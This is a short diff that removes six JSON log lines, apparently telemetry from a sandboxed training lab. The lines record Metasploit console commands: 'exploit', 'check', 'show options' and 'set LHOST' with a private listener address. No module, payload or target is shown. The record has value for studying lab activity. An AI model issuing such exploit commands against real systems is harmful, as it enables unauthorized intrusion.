@@ -1,6 +1,0 @@
-{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:22:13.149Z", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:23:17.893Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
-{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:23:20.136Z", "cmd_type": "msf-command", "cmd": "check"}
-{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:25:39.117Z", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:25:55.501Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:26:08.667Z", "cmd_type": "msf-command", "cmd": "exploit"}
